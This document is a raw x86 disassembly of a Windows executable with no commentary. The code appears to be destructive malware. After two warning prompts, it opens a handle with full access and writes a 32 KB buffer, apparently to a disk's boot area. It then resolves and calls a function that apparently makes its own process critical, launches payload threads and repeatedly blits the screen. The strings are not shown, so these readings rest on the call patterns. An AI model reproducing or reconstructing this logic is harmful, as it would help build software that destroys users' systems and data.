  401f48:	01 d0                	add    %edx,%eax
  401f4a:	c1 e0 03             	shl    $0x3,%eax
  401f4d:	01 d0                	add    %edx,%eax
  401f4f:	29 c1                	sub    %eax,%ecx
  401f51:	89 ca                	mov    %ecx,%edx
  401f53:	8d 5a ec             	lea    -0x14(%edx),%ebx
  401f56:	e8 59 f9 ff ff       	call   0x4018b4
  401f5b:	89 c1                	mov    %eax,%ecx
  401f5d:	ba 31 0c c3 30       	mov    $0x30c30c31,%edx
  401f62:	89 c8                	mov    %ecx,%eax
  401f64:	f7 ea                	imul   %edx
  401f66:	c1 fa 02             	sar    $0x2,%edx
  401f69:	89 c8                	mov    %ecx,%eax
  401f6b:	c1 f8 1f             	sar    $0x1f,%eax
  401f6e:	29 c2                	sub    %eax,%edx
  401f70:	89 d0                	mov    %edx,%eax
  401f72:	c1 e0 02             	shl    $0x2,%eax
  401f75:	01 d0                	add    %edx,%eax
  401f77:	c1 e0 02             	shl    $0x2,%eax
  401f7a:	01 d0                	add    %edx,%eax
  401f7c:	29 c1                	sub    %eax,%ecx
  401f7e:	89 ca                	mov    %ecx,%edx
  401f80:	8d 42 f6             	lea    -0xa(%edx),%eax
  401f83:	c7 44 24 20 20 00 cc 	movl   $0xcc0020,0x20(%esp)
  401f8a:	00 
  401f8b:	89 5c 24 1c          	mov    %ebx,0x1c(%esp)
  401f8f:	89 44 24 18          	mov    %eax,0x18(%esp)
  401f93:	8b 45 ec             	mov    -0x14(%ebp),%eax
  401f96:	89 44 24 14          	mov    %eax,0x14(%esp)
  401f9a:	8b 45 f0             	mov    -0x10(%ebp),%eax
  401f9d:	89 44 24 10          	mov    %eax,0x10(%esp)
  401fa1:	8b 45 f4             	mov    -0xc(%ebp),%eax
  401fa4:	89 44 24 0c          	mov    %eax,0xc(%esp)
  401fa8:	c7 44 24 08 00 00 00 	movl   $0x0,0x8(%esp)
  401faf:	00 
  401fb0:	c7 44 24 04 00 00 00 	movl   $0x0,0x4(%esp)
  401fb7:	00 
  401fb8:	8b 45 ec             	mov    -0x14(%ebp),%eax
  401fbb:	89 04 24             	mov    %eax,(%esp)
  401fbe:	a1 e0 b2 42 00       	mov    0x42b2e0,%eax
  401fc3:	ff d0                	call   *%eax
  401fc5:	83 ec 24             	sub    $0x24,%esp
  401fc8:	8b 45 ec             	mov    -0x14(%ebp),%eax
  401fcb:	89 44 24 04          	mov    %eax,0x4(%esp)
  401fcf:	c7 04 24 00 00 00 00 	movl   $0x0,(%esp)
  401fd6:	a1 cc b4 42 00       	mov    0x42b4cc,%eax
  401fdb:	ff d0                	call   *%eax
  401fdd:	83 ec 08             	sub    $0x8,%esp
  401fe0:	8b 45 ec             	mov    -0x14(%ebp),%eax
  401fe3:	89 04 24             	mov    %eax,(%esp)
  401fe6:	a1 ec b2 42 00       	mov    0x42b2ec,%eax
  401feb:	ff d0                	call   *%eax
  401fed:	83 ec 04             	sub    $0x4,%esp
  401ff0:	c7 44 24 08 00 00 00 	movl   $0x0,0x8(%esp)
  401ff7:	00 
  401ff8:	c7 44 24 04 70 1e 40 	movl   $0x401e70,0x4(%esp)
  401fff:	00 
  402000:	8b 45 08             	mov    0x8(%ebp),%eax
  402003:	89 04 24             	mov    %eax,(%esp)
  402006:	a1 b0 b4 42 00       	mov    0x42b4b0,%eax
  40200b:	ff d0                	call   *%eax
  40200d:	83 ec 0c             	sub    $0xc,%esp
  402010:	b8 01 00 00 00       	mov    $0x1,%eax
  402015:	8b 5d fc             	mov    -0x4(%ebp),%ebx
  402018:	c9                   	leave
  402019:	c2 08 00             	ret    $0x8
  40201c:	55                   	push   %ebp
  40201d:	89 e5                	mov    %esp,%ebp
  40201f:	83 ec 18             	sub    $0x18,%esp
  402022:	c7 44 24 08 00 00 00 	movl   $0x0,0x8(%esp)
  402029:	00 
  40202a:	c7 44 24 04 70 1e 40 	movl   $0x401e70,0x4(%esp)
  402031:	00 
  402032:	c7 04 24 00 00 00 00 	movl   $0x0,(%esp)
  402039:	a1 b0 b4 42 00       	mov    0x42b4b0,%eax
  40203e:	ff d0                	call   *%eax
  402040:	83 ec 0c             	sub    $0xc,%esp
  402043:	eb dd                	jmp    0x402022
  402045:	55                   	push   %ebp
  402046:	89 e5                	mov    %esp,%ebp
  402048:	83 ec 38             	sub    $0x38,%esp
  40204b:	c7 44 24 18 00 00 00 	movl   $0x0,0x18(%esp)
  402052:	00 
  402053:	c7 44 24 14 00 00 00 	movl   $0x0,0x14(%esp)
  40205a:	00 
  40205b:	c7 44 24 10 03 00 00 	movl   $0x3,0x10(%esp)
  402062:	00 
  402063:	c7 44 24 0c 00 00 00 	movl   $0x0,0xc(%esp)
  40206a:	00 
  40206b:	c7 44 24 08 03 00 00 	movl   $0x3,0x8(%esp)
  402072:	00 
  402073:	c7 44 24 04 00 00 00 	movl   $0x10000000,0x4(%esp)
  40207a:	10 
  40207b:	c7 04 24 20 f0 41 00 	movl   $0x41f020,(%esp)
  402082:	a1 0c b3 42 00       	mov    0x42b30c,%eax
  402087:	ff d0                	call   *%eax
  402089:	83 ec 1c             	sub    $0x1c,%esp
  40208c:	89 45 f4             	mov    %eax,-0xc(%ebp)
  40208f:	c7 44 24 10 00 00 00 	movl   $0x0,0x10(%esp)
  402096:	00 
  402097:	8d 45 f0             	lea    -0x10(%ebp),%eax
  40209a:	89 44 24 0c          	mov    %eax,0xc(%esp)
  40209e:	c7 44 24 08 00 80 00 	movl   $0x8000,0x8(%esp)
  4020a5:	00 
  4020a6:	c7 44 24 04 c0 f4 41 	movl   $0x41f4c0,0x4(%esp)
  4020ad:	00 
  4020ae:	8b 45 f4             	mov    -0xc(%ebp),%eax
  4020b1:	89 04 24             	mov    %eax,(%esp)
  4020b4:	a1 e4 b3 42 00       	mov    0x42b3e4,%eax
  4020b9:	ff d0                	call   *%eax
  4020bb:	83 ec 14             	sub    $0x14,%esp
  4020be:	8b 45 f4             	mov    -0xc(%ebp),%eax
  4020c1:	89 04 24             	mov    %eax,(%esp)
  4020c4:	a1 04 b3 42 00       	mov    0x42b304,%eax
  4020c9:	ff d0                	call   *%eax
  4020cb:	83 ec 04             	sub    $0x4,%esp
  4020ce:	c9                   	leave
  4020cf:	c3                   	ret
  4020d0:	55                   	push   %ebp
  4020d1:	89 e5                	mov    %esp,%ebp
  4020d3:	83 ec 48             	sub    $0x48,%esp
  4020d6:	c7 44 24 08 10 00 00 	movl   $0x10,0x8(%esp)
  4020dd:	00 
  4020de:	c7 44 24 04 00 00 00 	movl   $0x0,0x4(%esp)
  4020e5:	00 
  4020e6:	8d 45 d8             	lea    -0x28(%ebp),%eax
  4020e9:	89 04 24             	mov    %eax,(%esp)
  4020ec:	e8 af 03 00 00       	call   0x4024a0
  4020f1:	a1 3c b3 42 00       	mov    0x42b33c,%eax
  4020f6:	ff d0                	call   *%eax
  4020f8:	89 c2                	mov    %eax,%edx
  4020fa:	8d 45 f0             	lea    -0x10(%ebp),%eax
  4020fd:	89 44 24 08          	mov    %eax,0x8(%esp)
  402101:	c7 44 24 04 28 00 00 	movl   $0x28,0x4(%esp)
  402108:	00 
  402109:	89 14 24             	mov    %edx,(%esp)
  40210c:	a1 d8 b2 42 00       	mov    0x42b2d8,%eax
  402111:	ff d0                	call   *%eax
  402113:	83 ec 0c             	sub    $0xc,%esp
  402116:	85 c0                	test   %eax,%eax
  402118:	0f 94 c0             	sete   %al
  40211b:	84 c0                	test   %al,%al
  40211d:	74 0a                	je     0x402129
  40211f:	b8 00 00 00 00       	mov    $0x0,%eax
  402124:	e9 a6 00 00 00       	jmp    0x4021cf
  402129:	8d 45 e8             	lea    -0x18(%ebp),%eax
  40212c:	89 44 24 08          	mov    %eax,0x8(%esp)
  402130:	8b 45 08             	mov    0x8(%ebp),%eax
  402133:	89 44 24 04          	mov    %eax,0x4(%esp)
  402137:	c7 04 24 00 00 00 00 	movl   $0x0,(%esp)
  40213e:	a1 d4 b2 42 00       	mov    0x42b2d4,%eax
  402143:	ff d0                	call   *%eax
  402145:	83 ec 0c             	sub    $0xc,%esp
  402148:	85 c0                	test   %eax,%eax
  40214a:	0f 94 c0             	sete   %al
  40214d:	84 c0                	test   %al,%al
  40214f:	74 17                	je     0x402168
  402151:	8b 45 f0             	mov    -0x10(%ebp),%eax
  402154:	89 04 24             	mov    %eax,(%esp)
  402157:	a1 04 b3 42 00       	mov    0x42b304,%eax
  40215c:	ff d0                	call   *%eax
  40215e:	83 ec 04             	sub    $0x4,%esp
  402161:	b8 00 00 00 00       	mov    $0x0,%eax
  402166:	eb 67                	jmp    0x4021cf
  402168:	c7 45 d8 01 00 00 00 	movl   $0x1,-0x28(%ebp)
  40216f:	8b 45 e8             	mov    -0x18(%ebp),%eax
  402172:	8b 55 ec             	mov    -0x14(%ebp),%edx
  402175:	89 45 dc             	mov    %eax,-0x24(%ebp)
  402178:	89 55 e0             	mov    %edx,-0x20(%ebp)
  40217b:	c7 45 e4 02 00 00 00 	movl   $0x2,-0x1c(%ebp)
  402182:	8b 45 f0             	mov    -0x10(%ebp),%eax
  402185:	c7 44 24 14 00 00 00 	movl   $0x0,0x14(%esp)
  40218c:	00 
  40218d:	c7 44 24 10 00 00 00 	movl   $0x0,0x10(%esp)
  402194:	00 
  402195:	c7 44 24 0c 10 00 00 	movl   $0x10,0xc(%esp)
  40219c:	00 
  40219d:	8d 55 d8             	lea    -0x28(%ebp),%edx
  4021a0:	89 54 24 08          	mov    %edx,0x8(%esp)
  4021a4:	c7 44 24 04 00 00 00 	movl   $0x0,0x4(%esp)
  4021ab:	00 
  4021ac:	89 04 24             	mov    %eax,(%esp)
  4021af:	a1 c8 b2 42 00       	mov    0x42b2c8,%eax
  4021b4:	ff d0                	call   *%eax
  4021b6:	83 ec 18             	sub    $0x18,%esp
  4021b9:	89 45 f4             	mov    %eax,-0xc(%ebp)
  4021bc:	8b 45 f0             	mov    -0x10(%ebp),%eax
  4021bf:	89 04 24             	mov    %eax,(%esp)
  4021c2:	a1 04 b3 42 00       	mov    0x42b304,%eax
  4021c7:	ff d0                	call   *%eax
  4021c9:	83 ec 04             	sub    $0x4,%esp
  4021cc:	8b 45 f4             	mov    -0xc(%ebp),%eax
  4021cf:	c9                   	leave
  4021d0:	c3                   	ret
  4021d1:	55                   	push   %ebp
  4021d2:	89 e5                	mov    %esp,%ebp
  4021d4:	83 ec 28             	sub    $0x28,%esp
  4021d7:	c7 04 24 46 f0 41 00 	movl   $0x41f046,(%esp)
  4021de:	a1 78 b3 42 00       	mov    0x42b378,%eax
  4021e3:	ff d0                	call   *%eax
  4021e5:	83 ec 04             	sub    $0x4,%esp
  4021e8:	89 45 f4             	mov    %eax,-0xc(%ebp)
  4021eb:	83 7d f4 00          	cmpl   $0x0,-0xc(%ebp)
  4021ef:	74 5a                	je     0x40224b
  4021f1:	c7 04 24 50 f0 41 00 	movl   $0x41f050,(%esp)
  4021f8:	e8 d3 fe ff ff       	call   0x4020d0
  4021fd:	c7 44 24 04 61 f0 41 	movl   $0x41f061,0x4(%esp)
  402204:	00 
  402205:	8b 45 f4             	mov    -0xc(%ebp),%eax
  402208:	89 04 24             	mov    %eax,(%esp)
  40220b:	a1 54 b3 42 00       	mov    0x42b354,%eax
  402210:	ff d0                	call   *%eax
  402212:	83 ec 08             	sub    $0x8,%esp
  402215:	89 45 f0             	mov    %eax,-0x10(%ebp)
  402218:	83 7d f0 00          	cmpl   $0x0,-0x10(%ebp)
  40221c:	75 07                	jne    0x402225
  40221e:	b8 00 00 00 00       	mov    $0x0,%eax
  402223:	eb 2b                	jmp    0x402250
  402225:	c7 44 24 08 00 00 00 	movl   $0x0,0x8(%esp)
  40222c:	00 
  40222d:	c7 44 24 04 00 00 00 	movl   $0x0,0x4(%esp)
  402234:	00 
  402235:	c7 04 24 01 00 00 00 	movl   $0x1,(%esp)
  40223c:	8b 45 f0             	mov    -0x10(%ebp),%eax
  40223f:	ff d0                	call   *%eax
  402241:	83 ec 0c             	sub    $0xc,%esp
  402244:	b8 01 00 00 00       	mov    $0x1,%eax
  402249:	eb 05                	jmp    0x402250
  40224b:	b8 00 00 00 00       	mov    $0x0,%eax
  402250:	c9                   	leave
  402251:	c3                   	ret
  402252:	8d 4c 24 04          	lea    0x4(%esp),%ecx
  402256:	83 e4 f0             	and    $0xfffffff0,%esp
  402259:	ff 71 fc             	push   -0x4(%ecx)
  40225c:	55                   	push   %ebp
  40225d:	89 e5                	mov    %esp,%ebp
  40225f:	51                   	push   %ecx
  402260:	83 ec 24             	sub    $0x24,%esp
  402263:	e8 b8 c1 00 00       	call   0x40e420
  402268:	c7 44 24 0c 34 00 00 	movl   $0x34,0xc(%esp)
  40226f:	00 
  402270:	c7 44 24 08 7a f0 41 	movl   $0x41f07a,0x8(%esp)
  402277:	00 
  402278:	c7 44 24 04 90 f0 41 	movl   $0x41f090,0x4(%esp)
  40227f:	00 
  402280:	c7 04 24 00 00 00 00 	movl   $0x0,(%esp)
  402287:	a1 c4 b4 42 00       	mov    0x42b4c4,%eax
  40228c:	ff d0                	call   *%eax
  40228e:	83 ec 10             	sub    $0x10,%esp
  402291:	83 f8 07             	cmp    $0x7,%eax
  402294:	0f 94 c0             	sete   %al
  402297:	84 c0                	test   %al,%al
  402299:	74 0e                	je     0x4022a9
  40229b:	c7 04 24 00 00 00 00 	movl   $0x0,(%esp)
  4022a2:	a1 28 b3 42 00       	mov    0x42b328,%eax
  4022a7:	ff d0                	call   *%eax
  4022a9:	c7 44 24 0c 34 00 00 	movl   $0x34,0xc(%esp)
  4022b0:	00 
  4022b1:	c7 44 24 08 7a f0 41 	movl   $0x41f07a,0x8(%esp)
  4022b8:	00 
  4022b9:	c7 44 24 04 b8 f3 41 	movl   $0x41f3b8,0x4(%esp)
  4022c0:	00 
  4022c1:	c7 04 24 00 00 00 00 	movl   $0x0,(%esp)
  4022c8:	a1 c4 b4 42 00       	mov    0x42b4c4,%eax
  4022cd:	ff d0                	call   *%eax
  4022cf:	83 ec 10             	sub    $0x10,%esp
  4022d2:	83 f8 07             	cmp    $0x7,%eax
  4022d5:	0f 94 c0             	sete   %al
  4022d8:	84 c0                	test   %al,%al
  4022da:	74 0e                	je     0x4022ea
  4022dc:	c7 04 24 00 00 00 00 	movl   $0x0,(%esp)
  4022e3:	a1 28 b3 42 00       	mov    0x42b328,%eax
  4022e8:	ff d0                	call   *%eax
  4022ea:	e8 56 fd ff ff       	call   0x402045
  4022ef:	e8 dd fe ff ff       	call   0x4021d1
  4022f4:	c7 04 24 b8 0b 00 00 	movl   $0xbb8,(%esp)
  4022fb:	a1 ac b3 42 00       	mov    0x42b3ac,%eax
  402300:	ff d0                	call   *%eax
  402302:	83 ec 04             	sub    $0x4,%esp
  402305:	c7 44 24 14 00 00 00 	movl   $0x0,0x14(%esp)
  40230c:	00 
  40230d:	c7 44 24 10 00 00 00 	movl   $0x0,0x10(%esp)
  402314:	00 
  402315:	c7 44 24 0c 00 00 00 	movl   $0x0,0xc(%esp)
  40231c:	00 
  40231d:	c7 44 24 08 b3 1d 40 	movl   $0x401db3,0x8(%esp)
  402324:	00 
  402325:	c7 44 24 04 00 00 00 	movl   $0x0,0x4(%esp)
  40232c:	00 
  40232d:	c7 04 24 00 00 00 00 	movl   $0x0,(%esp)
  402334:	a1 18 b3 42 00       	mov    0x42b318,%eax
  402339:	ff d0                	call   *%eax
  40233b:	83 ec 18             	sub    $0x18,%esp
  40233e:	c7 04 24 88 13 00 00 	movl   $0x1388,(%esp)
  402345:	a1 ac b3 42 00       	mov    0x42b3ac,%eax
  40234a:	ff d0                	call   *%eax
  40234c:	83 ec 04             	sub    $0x4,%esp
  40234f:	c7 44 24 14 00 00 00 	movl   $0x0,0x14(%esp)
  402356:	00 
  402357:	c7 44 24 10 00 00 00 	movl   $0x0,0x10(%esp)
  40235e:	00 
  40235f:	c7 44 24 0c 00 00 00 	movl   $0x0,0xc(%esp)
  402366:	00 
  402367:	c7 44 24 08 27 15 40 	movl   $0x401527,0x8(%esp)
  40236e:	00 
  40236f:	c7 44 24 04 00 00 00 	movl   $0x0,0x4(%esp)
  402376:	00 
  402377:	c7 04 24 00 00 00 00 	movl   $0x0,(%esp)
  40237e:	a1 18 b3 42 00       	mov    0x42b318,%eax
  402383:	ff d0                	call   *%eax
  402385:	83 ec 18             	sub    $0x18,%esp
  402388:	c7 44 24 14 00 00 00 	movl   $0x0,0x14(%esp)
  40238f:	00 
  402390:	c7 44 24 10 00 00 00 	movl   $0x0,0x10(%esp)
  402397:	00 
  402398:	c7 44 24 0c 00 00 00 	movl   $0x0,0xc(%esp)
  40239f:	00 
  4023a0:	c7 44 24 08 64 15 40 	movl   $0x401564,0x8(%esp)
  4023a7:	00 
  4023a8:	c7 44 24 04 00 00 00 	movl   $0x0,0x4(%esp)
  4023af:	00 
  4023b0:	c7 04 24 00 00 00 00 	movl   $0x0,(%esp)
  4023b7:	a1 18 b3 42 00       	mov    0x42b318,%eax
  4023bc:	ff d0                	call   *%eax
  4023be:	83 ec 18             	sub    $0x18,%esp
  4023c1:	c7 44 24 14 00 00 00 	movl   $0x0,0x14(%esp)
  4023c8:	00 
  4023c9:	c7 44 24 10 00 00 00 	movl   $0x0,0x10(%esp)
  4023d0:	00 
  4023d1:	c7 44 24 0c 00 00 00 	movl   $0x0,0xc(%esp)
  4023d8:	00 
  4023d9:	c7 44 24 08 48 16 40 	movl   $0x401648,0x8(%esp)
  4023e0:	00 
  4023e1:	c7 44 24 04 00 00 00 	movl   $0x0,0x4(%esp)
  4023e8:	00 
  4023e9:	c7 04 24 00 00 00 00 	movl   $0x0,(%esp)
  4023f0:	a1 18 b3 42 00       	mov    0x42b318,%eax
  4023f5:	ff d0                	call   *%eax
  4023f7:	83 ec 18             	sub    $0x18,%esp
  4023fa:	c7 44 24 14 00 00 00 	movl   $0x0,0x14(%esp)
  402401:	00 
  402402:	c7 44 24 10 00 00 00 	movl   $0x0,0x10(%esp)
  402409:	00 
  40240a:	c7 44 24 0c 00 00 00 	movl   $0x0,0xc(%esp)
  402411:	00 
  402412:	c7 44 24 08 0c 17 40 	movl   $0x40170c,0x8(%esp)
  402419:	00 
  40241a:	c7 44 24 04 00 00 00 	movl   $0x0,0x4(%esp)
  402421:	00 
  402422:	c7 04 24 00 00 00 00 	movl   $0x0,(%esp)
  402429:	a1 18 b3 42 00       	mov    0x42b318,%eax
  40242e:	ff d0                	call   *%eax
  402430:	83 ec 18             	sub    $0x18,%esp
  402433:	c7 44 24 14 0a 00 00 	movl   $0xa,0x14(%esp)
  40243a:	00 
  40243b:	c7 44 24 10 00 00 00 	movl   $0x0,0x10(%esp)
  402442:	00 
  402443:	c7 44 24 0c a6 f4 41 	movl   $0x41f4a6,0xc(%esp)
  40244a:	00 
  40244b:	c7 44 24 08 a9 f4 41 	movl   $0x41f4a9,0x8(%esp)
  402452:	00 
  402453:	c7 44 24 04 00 00 00 	movl   $0x0,0x4(%esp)
  40245a:	00 
  40245b:	c7 04 24 00 00 00 00 	movl   $0x0,(%esp)
  402462:	a1 a0 b4 42 00       	mov    0x42b4a0,%eax
  402467:	ff d0                	call   *%eax
  402469:	83 ec 18             	sub    $0x18,%esp
  40246c:	e8 ab fb ff ff       	call   0x40201c
  402471:	c7 04 24 30 75 00 00 	movl   $0x7530,(%esp)
  402478:	a1 ac b3 42 00       	mov    0x42b3ac,%eax
  40247d:	ff d0                	call   *%eax
  40247f:	83 ec 04             	sub    $0x4,%esp
  402482:	b8 00 00 00 00       	mov    $0x0,%eax
  402487:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  40248a:	c9                   	leave
  40248b:	8d 61 fc             	lea    -0x4(%ecx),%esp
  40248e:	c3                   	ret
  40248f:	90                   	nop
  402490:	ff 25 98 b4 42 00    	jmp    *0x42b498
  402496:	90                   	nop
  402497:	90                   	nop
  402498:	ff 25 90 b4 42 00    	jmp    *0x42b490
  40249e:	90                   	nop
  40249f:	90                   	nop
  4024a0:	ff 25 94 b4 42 00    	jmp    *0x42b494
  4024a6:	90                   	nop
  4024a7:	90                   	nop
  4024a8:	66 90                	xchg   %ax,%ax
  4024aa:	66 90                	xchg   %ax,%ax
  4024ac:	66 90                	xchg   %ax,%ax
  4024ae:	66 90                	xchg   %ax,%ax
  4024b0:	83 fa 4b             	cmp    $0x4b,%edx
  4024b3:	77 5f                	ja     0x402514
  4024b5:	55                   	push   %ebp
  4024b6:	57                   	push   %edi
  4024b7:	56                   	push   %esi
  4024b8:	89 c6                	mov    %eax,%esi
  4024ba:	53                   	push   %ebx
  4024bb:	ff 24 95 80 76 42 00 	jmp    *0x427680(,%edx,4)
  4024c2:	85 c9                	test   %ecx,%ecx
  4024c4:	74 4a                	je     0x402510
  4024c6:	8b 5e 14             	mov    0x14(%esi),%ebx
  4024c9:	31 c0                	xor    %eax,%eax
  4024cb:	3b 5e 18             	cmp    0x18(%esi),%ebx
  4024ce:	7d 22                	jge    0x4024f2
  4024d0:	8b 6e 10             	mov    0x10(%esi),%ebp
  4024d3:	8d 3c 5b             	lea    (%ebx,%ebx,2),%edi
  4024d6:	83 c3 01             	add    $0x1,%ebx
  4024d9:	89 5e 14             	mov    %ebx,0x14(%esi)
  4024dc:	8d 7c bd 00          	lea    0x0(%ebp,%edi,4),%edi
  4024e0:	85 ff                	test   %edi,%edi
  4024e2:	74 0e                	je     0x4024f2
  4024e4:	8b 44 24 14          	mov    0x14(%esp),%eax
  4024e8:	89 17                	mov    %edx,(%edi)
  4024ea:	89 4f 04             	mov    %ecx,0x4(%edi)
  4024ed:	89 47 08             	mov    %eax,0x8(%edi)
  4024f0:	89 f8                	mov    %edi,%eax
  4024f2:	5b                   	pop    %ebx
  4024f3:	5e                   	pop    %esi
  4024f4:	5f                   	pop    %edi
  4024f5:	5d                   	pop    %ebp
  4024f6:	c3                   	ret
  4024f7:	89 f6                	mov    %esi,%esi
  4024f9:	8d bc 27 00 00 00 00 	lea    0x0(%edi,%eiz,1),%edi
  402500:	85 c9                	test   %ecx,%ecx
  402502:	74 0c                	je     0x402510
  402504:	8b 44 24 14          	mov    0x14(%esp),%eax
  402508:	85 c0                	test   %eax,%eax
  40250a:	75 ba                	jne    0x4024c6
  40250c:	8d 74 26 00          	lea    0x0(%esi,%eiz,1),%esi
  402510:	31 c0                	xor    %eax,%eax
  402512:	eb de                	jmp    0x4024f2
  402514:	31 c0                	xor    %eax,%eax
  402516:	c3                   	ret
  402517:	89 f6                	mov    %esi,%esi
  402519:	8d bc 27 00 00 00 00 	lea    0x0(%edi,%eiz,1),%edi
  402520:	57                   	push   %edi
  402521:	56                   	push   %esi
  402522:	53                   	push   %ebx
  402523:	8b 58 14             	mov    0x14(%eax),%ebx
  402526:	3b 58 18             	cmp    0x18(%eax),%ebx
  402529:	7d 35                	jge    0x402560
  40252b:	8b 70 10             	mov    0x10(%eax),%esi
  40252e:	8d 3c 5b             	lea    (%ebx,%ebx,2),%edi
  402531:	83 c3 01             	add    $0x1,%ebx
  402534:	89 58 14             	mov    %ebx,0x14(%eax)
  402537:	8d 34 be             	lea    (%esi,%edi,4),%esi
  40253a:	85 f6                	test   %esi,%esi
  40253c:	0f 94 c3             	sete   %bl
  40253f:	85 d2                	test   %edx,%edx
  402541:	0f 94 c0             	sete   %al
  402544:	08 c3                	or     %al,%bl
  402546:	75 18                	jne    0x402560
  402548:	85 c9                	test   %ecx,%ecx
  40254a:	74 14                	je     0x402560
  40254c:	c7 06 00 00 00 00    	movl   $0x0,(%esi)
  402552:	89 56 04             	mov    %edx,0x4(%esi)
  402555:	89 f0                	mov    %esi,%eax
  402557:	89 4e 08             	mov    %ecx,0x8(%esi)
  40255a:	5b                   	pop    %ebx
  40255b:	5e                   	pop    %esi
  40255c:	5f                   	pop    %edi
  40255d:	c3                   	ret
  40255e:	66 90                	xchg   %ax,%ax
  402560:	5b                   	pop    %ebx
  402561:	31 c0                	xor    %eax,%eax
  402563:	5e                   	pop    %esi
  402564:	5f                   	pop    %edi
  402565:	c3                   	ret
  402566:	8d 76 00             	lea    0x0(%esi),%esi
  402569:	8d bc 27 00 00 00 00 	lea    0x0(%edi,%eiz,1),%edi
  402570:	55                   	push   %ebp
  402571:	57                   	push   %edi
  402572:	89 d5                	mov    %edx,%ebp
  402574:	56                   	push   %esi
  402575:	53                   	push   %ebx
  402576:	89 c3                	mov    %eax,%ebx
  402578:	89 cf                	mov    %ecx,%edi
  40257a:	89 d6                	mov    %edx,%esi
  40257c:	83 ec 04             	sub    $0x4,%esp
  40257f:	8b 40 0c             	mov    0xc(%eax),%eax
  402582:	0f b6 00             	movzbl (%eax),%eax
  402585:	eb 43                	jmp    0x4025ca
  402587:	89 f6                	mov    %esi,%esi
  402589:	8d bc 27 00 00 00 00 	lea    0x0(%edi,%eiz,1),%edi
  402590:	84 d2                	test   %dl,%dl
  402592:	75 42                	jne    0x4025d6
  402594:	3c 4b                	cmp    $0x4b,%al
  402596:	75 78                	jne    0x402610
  402598:	83 43 0c 01          	addl   $0x1,0xc(%ebx)
  40259c:	83 ff 01             	cmp    $0x1,%edi
  40259f:	19 d2                	sbb    %edx,%edx
  4025a1:	83 43 30 06          	addl   $0x6,0x30(%ebx)
  4025a5:	83 e2 fd             	and    $0xfffffffd,%edx
  4025a8:	83 c2 1e             	add    $0x1e,%edx
  4025ab:	31 c9                	xor    %ecx,%ecx
  4025ad:	c7 04 24 00 00 00 00 	movl   $0x0,(%esp)
  4025b4:	89 d8                	mov    %ebx,%eax
  4025b6:	e8 f5 fe ff ff       	call   0x4024b0
  4025bb:	85 c0                	test   %eax,%eax
  4025bd:	89 06                	mov    %eax,(%esi)
  4025bf:	74 44                	je     0x402605
  4025c1:	8d 70 04             	lea    0x4(%eax),%esi
  4025c4:	8b 43 0c             	mov    0xc(%ebx),%eax
  4025c7:	0f b6 00             	movzbl (%eax),%eax
  4025ca:	3c 72                	cmp    $0x72,%al
  4025cc:	0f 94 c2             	sete   %dl
  4025cf:	3c 56                	cmp    $0x56,%al
  4025d1:	0f 94 c1             	sete   %cl
  4025d4:	75 ba                	jne    0x402590
  4025d6:	83 43 0c 01          	addl   $0x1,0xc(%ebx)
  4025da:	84 d2                	test   %dl,%dl
  4025dc:	74 12                	je     0x4025f0
  4025de:	83 ff 01             	cmp    $0x1,%edi
  4025e1:	19 d2                	sbb    %edx,%edx
  4025e3:	83 43 30 09          	addl   $0x9,0x30(%ebx)
  4025e7:	83 e2 fd             	and    $0xfffffffd,%edx
  4025ea:	83 c2 1c             	add    $0x1c,%edx
  4025ed:	eb bc                	jmp    0x4025ab
  4025ef:	90                   	nop
  4025f0:	84 c9                	test   %cl,%cl
  4025f2:	74 a8                	je     0x40259c
  4025f4:	83 ff 01             	cmp    $0x1,%edi
  4025f7:	19 d2                	sbb    %edx,%edx
  4025f9:	83 43 30 09          	addl   $0x9,0x30(%ebx)
  4025fd:	83 e2 fd             	and    $0xfffffffd,%edx
  402600:	83 c2 1d             	add    $0x1d,%edx
  402603:	eb a6                	jmp    0x4025ab
  402605:	83 c4 04             	add    $0x4,%esp
  402608:	31 c0                	xor    %eax,%eax
  40260a:	5b                   	pop    %ebx
  40260b:	5e                   	pop    %esi
  40260c:	5f                   	pop    %edi
  40260d:	5d                   	pop    %ebp
  40260e:	c3                   	ret
  40260f:	90                   	nop
  402610:	85 ff                	test   %edi,%edi
  402612:	75 3d                	jne    0x402651
  402614:	3c 46                	cmp    $0x46,%al
  402616:	75 39                	jne    0x402651
  402618:	39 f5                	cmp    %esi,%ebp
  40261a:	75 1c                	jne    0x402638
  40261c:	eb 33                	jmp    0x402651
  40261e:	66 90                	xchg   %ax,%ax
  402620:	83 f8 1b             	cmp    $0x1b,%eax
  402623:	74 3b                	je     0x402660
  402625:	83 f8 19             	cmp    $0x19,%eax
  402628:	75 07                	jne    0x402631
  40262a:	c7 45 00 1c 00 00 00 	movl   $0x1c,0x0(%ebp)
  402631:	83 c5 04             	add    $0x4,%ebp
  402634:	39 f5                	cmp    %esi,%ebp
  402636:	74 19                	je     0x402651
  402638:	8b 6d 00             	mov    0x0(%ebp),%ebp
  40263b:	8b 45 00             	mov    0x0(%ebp),%eax
  40263e:	83 f8 1a             	cmp    $0x1a,%eax
  402641:	75 dd                	jne    0x402620
  402643:	c7 45 00 1d 00 00 00 	movl   $0x1d,0x0(%ebp)
  40264a:	83 c5 04             	add    $0x4,%ebp
  40264d:	39 f5                	cmp    %esi,%ebp
  40264f:	75 e7                	jne    0x402638
  402651:	83 c4 04             	add    $0x4,%esp
  402654:	89 f0                	mov    %esi,%eax
  402656:	5b                   	pop    %ebx
  402657:	5e                   	pop    %esi
  402658:	5f                   	pop    %edi
  402659:	5d                   	pop    %ebp
  40265a:	c3                   	ret
  40265b:	90                   	nop
  40265c:	8d 74 26 00          	lea    0x0(%esi,%eiz,1),%esi
  402660:	c7 45 00 1e 00 00 00 	movl   $0x1e,0x0(%ebp)
  402667:	eb c8                	jmp    0x402631
  402669:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi
  402670:	56                   	push   %esi
  402671:	53                   	push   %ebx
  402672:	89 c3                	mov    %eax,%ebx
  402674:	89 d0                	mov    %edx,%eax
  402676:	83 ec 04             	sub    $0x4,%esp
  402679:	8b 73 0c             	mov    0xc(%ebx),%esi
  40267c:	0f b6 16             	movzbl (%esi),%edx
  40267f:	80 fa 52             	cmp    $0x52,%dl
  402682:	0f 94 c1             	sete   %cl
  402685:	80 fa 4f             	cmp    $0x4f,%dl
  402688:	74 0a                	je     0x402694
  40268a:	84 c9                	test   %cl,%cl
  40268c:	75 32                	jne    0x4026c0
  40268e:	83 c4 04             	add    $0x4,%esp
  402691:	5b                   	pop    %ebx
  402692:	5e                   	pop    %esi
  402693:	c3                   	ret
